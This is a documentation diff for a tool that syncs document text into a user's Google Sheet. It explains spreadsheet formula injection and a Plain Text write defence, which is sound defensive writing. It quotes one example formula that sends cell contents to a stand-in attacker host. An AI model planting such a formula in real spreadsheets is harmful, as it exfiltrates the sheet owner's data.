@@ -52,6 +52,31 @@ Keys are sealed **before** they touch storage:
 Defence in depth: even if the client-side filter were removed, the server guard still refuses
 the batch, and even if the server guard were removed, the client never builds the payload.
 
+## A document cannot write a formula into your Sheet
+
+Everything sync writes is text that came from a PDF, a translation model, or a field somebody
+typed. Sheets parses a cell on the way *in*, not only on display: a string starting with `=`
+becomes a live formula, one starting with `+`, `-` or `@` becomes arithmetic, one that looks like
+a date becomes a date. So a document opening with
+
+```
+=IMPORTDATA("https://attacker.example/collect?d=" & A1)
+```
+
+would, on the next sync, phone home from inside the reader's own spreadsheet — carrying whatever
+else that spreadsheet holds. This is not exotic: an equation page, a hyphen bullet, a phone number
+and a date are all ordinary content that trips the same parse.
+
+`Code.gs` therefore writes every request-derived value through `writePlain_`, which formats the
+destination range as **Plain Text** before `setValues`. The parse never happens, and — unlike the
+usual apostrophe-prefix mitigation — nothing is added to or removed from the value, so a paragraph
+that opens with `-` returns from the Sheet with its hyphen intact. Numbers and booleans keep their
+type; Plain Text only stops *text* from being read as something else.
+
+The only raw `setValues` calls left are the header rows, whose contents are literals defined at the
+top of the same file. `src/sync/appsScript.test.ts` reads `Code.gs` and fails if a data write ever
+bypasses the helper again.
+
 ## Plaintext key sync (opt-in, and reversible)
 
 Your Sheet is your own database — you created it, you hold its `TOKEN`, and you control who it
